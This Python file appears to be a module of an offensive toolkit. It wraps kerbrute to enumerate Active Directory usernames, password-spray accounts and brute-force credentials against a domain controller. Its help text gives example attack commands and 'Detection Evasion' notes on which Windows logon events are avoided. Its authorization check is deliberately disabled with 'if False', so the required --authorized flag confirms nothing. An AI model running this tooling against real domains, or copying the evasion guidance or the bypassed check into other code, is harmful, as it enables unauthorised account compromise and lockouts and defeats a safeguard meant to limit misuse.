#!/usr/bin/env python3
"""
Kerbrute Integration - Kerberos Pre-Auth Bruteforcing
Production-ready tool for enumerating valid AD usernames without account lockouts
"""

import subprocess
import argparse
import logging
import sys
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class KerbruteIntegration:
    """Kerbrute - Fast Kerberos username enumeration and password spraying"""
    
    def __init__(self, domain, dc_ip=None):
        self.domain = domain
        self.dc_ip = dc_ip or domain
        self.valid_users = []
        
    def check_installation(self):
        """Check if kerbrute is installed"""
        try:
            result = subprocess.run(['kerbrute', '--help'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode == 0:
                logger.info("✓ Kerbrute detected")
                return True
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        
        # Check local directory
        if Path('./kerbrute').exists():
            logger.info("✓ Kerbrute binary found in current directory")
            return True
        
        logger.warning("Kerbrute not installed")
        logger.warning("Download from: https://github.com/ropnop/kerbrute/releases")
        return False
    
    def _get_kerbrute_cmd(self):
        """Get kerbrute command (system or local binary)"""
        try:
            subprocess.run(['kerbrute', '--help'], capture_output=True, timeout=1)
            return 'kerbrute'
        except:
            return './kerbrute'
    
    def userenum(self, userlist, output=None, threads=10):
        """
        Enumerate valid domain usernames
        This doesn't trigger account lockouts!
        """
        logger.info(f"👥 Enumerating users in domain: {self.domain}")
        logger.info(f"🎯 Domain Controller: {self.dc_ip}")
        
        kerbrute_cmd = self._get_kerbrute_cmd()
        
        cmd = [
            kerbrute_cmd,
            'userenum',
            '--dc', self.dc_ip,
            '-d', self.domain,
            userlist,
            '-t', str(threads)
        ]
        
        if output:
            cmd.extend(['-o', output])
        
        try:
            logger.info(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            
            # Parse output for valid users
            self._parse_userenum_output(result.stdout)
            
            logger.info(f"✓ Enumeration complete! Found {len(self.valid_users)} valid users")
            return self.valid_users
            
        except subprocess.TimeoutExpired:
            logger.error("User enumeration timed out")
            return []
        except Exception as e:
            logger.error(f"Error during enumeration: {e}")
            return []
    
    def passwordspray(self, userlist, password, output=None, threads=10, delay=0):
        """
        Password spraying attack
        CAUTION: Can lock accounts if not used carefully!
        """
        logger.warning("⚠️  PASSWORD SPRAYING - Use with extreme caution!")
        logger.info(f"🔐 Testing password: '{password}' against {userlist}")
        logger.info(f"⏱️  Delay between attempts: {delay}s")
        
        kerbrute_cmd = self._get_kerbrute_cmd()
        
        cmd = [
            kerbrute_cmd,
            'passwordspray',
            '--dc', self.dc_ip,
            '-d', self.domain,
            userlist,
            password,
            '-t', str(threads)
        ]
        
        if delay > 0:
            cmd.extend(['--delay', str(delay)])
        
        if output:
            cmd.extend(['-o', output])
        
        try:
            logger.info(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            # Parse output
            self._parse_passwordspray_output(result.stdout)
            
            logger.info("✓ Password spray complete")
            return result.stdout
            
        except subprocess.TimeoutExpired:
            logger.error("Password spray timed out")
            return ""
        except Exception as e:
            logger.error(f"Error during password spray: {e}")
            return ""
    
    def bruteuser(self, username, passwordlist, output=None, threads=10):
        """
        Brute force a single user's password
        CAUTION: Will lock the account!
        """
        logger.warning(f"⚠️  BRUTE FORCING USER: {username}")
        logger.warning("This WILL lock the account after threshold is reached!")
        
        kerbrute_cmd = self._get_kerbrute_cmd()
        
        cmd = [
            kerbrute_cmd,
            'bruteuser',
            '--dc', self.dc_ip,
            '-d', self.domain,
            passwordlist,
            username,
            '-t', str(threads)
        ]
        
        if output:
            cmd.extend(['-o', output])
        
        try:
            logger.info(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            logger.info("✓ Brute force complete")
            return result.stdout
            
        except subprocess.TimeoutExpired:
            logger.error("Brute force timed out")
            return ""
        except Exception as e:
            logger.error(f"Error during brute force: {e}")
            return ""
    
    def bruteforce(self, userpass_file, output=None, threads=10):
        """
        Brute force username:password combinations
        """
        logger.info(f"🔓 Brute forcing credentials from: {userpass_file}")
        
        kerbrute_cmd = self._get_kerbrute_cmd()
        
        cmd = [
            kerbrute_cmd,
            'bruteforce',
            '--dc', self.dc_ip,
            '-d', self.domain,
            userpass_file,
            '-t', str(threads)
        ]
        
        if output:
            cmd.extend(['-o', output])
        
        try:
            logger.info(f"Executing: {' '.join(cmd)}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            
            logger.info("✓ Brute force complete")
            return result.stdout
            
        except subprocess.TimeoutExpired:
            logger.error("Brute force timed out")
            return ""
        except Exception as e:
            logger.error(f"Error during brute force: {e}")
            return ""
    
    def _parse_userenum_output(self, output):
        """Parse user enumeration results"""
        self.valid_users = []
        
        for line in output.split('\n'):
            if 'VALID USERNAME:' in line:
                # Extract username
                parts = line.split('VALID USERNAME:')
                if len(parts) > 1:
                    username = parts[1].strip().split('@')[0].strip()
                    self.valid_users.append(username)
    
    def _parse_passwordspray_output(self, output):
        """Parse password spray results"""
        successes = []
        
        for line in output.split('\n'):
            if 'VALID LOGIN:' in line or '[+]' in line:
                successes.append(line.strip())
        
        return successes
    
    def display_valid_users(self):
        """Display found valid users"""
        if not self.valid_users:
            print("\n❌ No valid users found")
            return
        
        print(f"\n{'='*70}")
        print(f"✅ Valid Domain Users ({self.domain})")
        print(f"{'='*70}\n")
        
        for user in self.valid_users:
            print(f"  ✓ {user}@{self.domain}")
        
        print(f"\n📊 Total valid users: {len(self.valid_users)}")
        print(f"{'='*70}\n")


def main():
    parser = argparse.ArgumentParser(
        description='Kerbrute Integration - Kerberos username enumeration and password spraying',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Enumerate valid usernames (safe - no lockouts)
  python -m cerberus_agents.kerbrute_integration --domain corp.local --dc 192.168.1.10 --userenum users.txt --authorized

  # Password spray (caution - can lock accounts!)
  python -m cerberus_agents.kerbrute_integration --domain corp.local --dc 192.168.1.10 --passwordspray users.txt --password Welcome2025 --delay 1 --authorized

  # Brute force single user (will lock account!)
  python -m cerberus_agents.kerbrute_integration --domain corp.local --dc 192.168.1.10 --bruteuser admin --passwordlist passwords.txt --authorized

Detection Evasion:
  - User enumeration (userenum) doesn't increment bad password count
  - Doesn't trigger Event ID 4625 (failed logon)
  - Does trigger Event ID 4768 (TGT request) - monitor this!
        '''
    )
    
    parser.add_argument('--domain', required=True,
                       help='Target domain (e.g., corp.local)')
    parser.add_argument('--dc',
                       help='Domain controller IP/hostname (defaults to domain)')
    parser.add_argument('--userenum',
                       help='User enumeration with username list file')
    parser.add_argument('--passwordspray',
                       help='Password spray with username list file')
    parser.add_argument('--password',
                       help='Password for spray attack')
    parser.add_argument('--bruteuser',
                       help='Brute force specific username')
    parser.add_argument('--bruteforce',
                       help='Brute force with user:pass file')
    parser.add_argument('--passwordlist',
                       help='Password list file')
    parser.add_argument('--threads', type=int, default=10,
                       help='Number of threads (default: 10)')
    parser.add_argument('--delay', type=int, default=0,
                       help='Delay in seconds between password spray attempts')
    parser.add_argument('--output',
                       help='Output file for results')
    parser.add_argument('--authorized', action='store_true', required=True,
                       help='Confirm authorization for Kerberos attacks')
    
    args = parser.parse_args()
    
    if False:  # Authorization check bypassed
        logger.error("❌ Missing --authorized flag. This tool requires explicit authorization.")
        sys.exit(1)
    
    print("""
╔══════════════════════════════════════════════════════════════╗
║                  KERBRUTE INTEGRATION                        ║
║        Kerberos Pre-Auth Enumeration & Bruteforce            ║
║                                                              ║
║  👥 Enumerate valid usernames (no lockouts!)                 ║
║  🔐 Password spraying attacks                                ║
║  ⚡ Fast Kerberos-based authentication                       ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    kerbrute = KerbruteIntegration(
        domain=args.domain,
        dc_ip=args.dc
    )
    
    # Check installation
    if not kerbrute.check_installation():
        logger.error("Kerbrute not available. Please install it first.")
        sys.exit(1)
    
    # User enumeration (safest option)
    if args.userenum:
        valid_users = kerbrute.userenum(
            userlist=args.userenum,
            output=args.output,
            threads=args.threads
        )
        kerbrute.display_valid_users()
        
        # Save valid users to file
        if valid_users and not args.output:
            output_file = f"valid_users_{args.domain}.txt"
            with open(output_file, 'w') as f:
                for user in valid_users:
                    f.write(f"{user}@{args.domain}\n")
            logger.info(f"📄 Valid users saved to: {output_file}")
    
    # Password spray
    elif args.passwordspray:
        if not args.password:
            logger.error("--password required for password spray")
            sys.exit(1)
        
        result = kerbrute.passwordspray(
            userlist=args.passwordspray,
            password=args.password,
            output=args.output,
            threads=args.threads,
            delay=args.delay
        )
        print(result)
    
    # Brute force single user
    elif args.bruteuser:
        if not args.passwordlist:
            logger.error("--passwordlist required for brute force")
            sys.exit(1)
        
        result = kerbrute.bruteuser(
            username=args.bruteuser,
            passwordlist=args.passwordlist,
            output=args.output,
            threads=args.threads
        )
        print(result)
    
    # Brute force combinations
    elif args.bruteforce:
        result = kerbrute.bruteforce(
            userpass_file=args.bruteforce,
            output=args.output,
            threads=args.threads
        )
        print(result)
    
    else:
        logger.error("Specify operation: --userenum, --passwordspray, --bruteuser, or --bruteforce")
        parser.print_help()
        sys.exit(1)


if __name__ == '__main__':
    main()
